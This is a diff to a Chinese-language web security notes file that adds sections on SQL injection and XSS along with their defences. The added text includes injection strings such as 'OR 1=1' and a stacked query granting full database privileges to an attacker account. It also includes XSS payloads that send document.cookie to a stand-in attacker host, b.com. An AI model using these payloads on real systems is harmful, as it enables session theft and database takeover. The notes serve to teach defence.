@@ -70,7 +70,62 @@ GRUB必须设置密码，物理服务器的Idrac/imm/ilo等账号默认密码也
 注意到AES有很多不同的算法，如aes192，aes-128-ecb，aes-256-cbc等，AES除了密钥外还可以指定IV（Initial Vector），不同的系统只要IV不同，用相同的密钥加密相同的数据得到的加密结果也是不同的。加密结果通常有两种表示方法：hex和base64，这些功能Nodejs全部都支持，但是在应用中要注意，如果加解密双方一方用Nodejs，另一方用Java、PHP等其它语言，需要仔细测试。如果无法正确解密，要确认双方是否遵循同样的AES算法，字符串密钥和IV是否相同，加密后的数据是否统一为hex或base64格式。
 
 ## SQL 注入
-mysql_real_escape_string()
+
+* 注入式攻击的类型：添加多余信息
+* 多个查询注入:将终止符插入到查询中即可实现
+
+```sql
+SELECT * FROM wines WHERE variety = 'lagrein' OR 1=1;
+UPDATE wines SET type='red'，'vintage'='9999' WHERE variety = 'lagrein'  OR 1=1;
+
+SELECT * FROM wines WHERE variety = 'lagrein' ; GRANT ALL ON *.* TO 'BadGuy@%' IDENTIFIED BY 'gotcha';`'`
+```
+
+### 原则
+
+* 永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双"-"进行转换等。
+* 永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。
+* 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。
+* 不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。
+* 应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装
+* sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。
+
+### 解决方法
+
+* 检查用户提交的值的类型
+* mysql_real_escape_string()
+* ike查询时，如果用户输入的值有`"_"`和"%"，则会出现这种情况：用户本来只是想查询"abcd_"，查询结果中却有"abcd_"、"abcde"、"abcdf"等等；用户要查询"30%"（注：百分之三十）时也会出现问题。addcslashes()函数在指定的字符前添加反斜杠。
+* PHP的PDO扩展的 prepare 方法
+* 不要使用magic_quotes_gpc指令或它的"幕后搭挡"-addslashes()函数，此函数在应用程序开发中是被限制使用的，并且此函数还要求使用额外的步骤-使用stripslashes()函数。 
+
+```php
+if (get_magic_quotes_gpc()) 
+{
+ $name = stripslashes($name);
+}
+$name = mysql_real_escape_string($name);
+mysql_query("SELECT * FROM users WHERE name='{$name}'");
+
+$sub = addcslashes(mysql_real_escape_string("%something_"), "%_");
+```
 ## xss
-htmlspecialchars
+
+Cross SiteScript，跨站脚本攻击.在页面执行你想要的js.理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。
+
+* DOM Based XSS漏洞
+    - 获取cookies(对http-only没用)
+        + Tom注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！
+
+* Stored XSS漏洞
+    - a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！
+
+控制用户的动作(发帖、私信什么的)
+
+### 解决方案
+
+* htmlspecialchars函数
+* htmlentities函数
+* HTMLPurifier.auto.php插件
+* RemoveXss函数（百度可以查到）
+
 ## cors
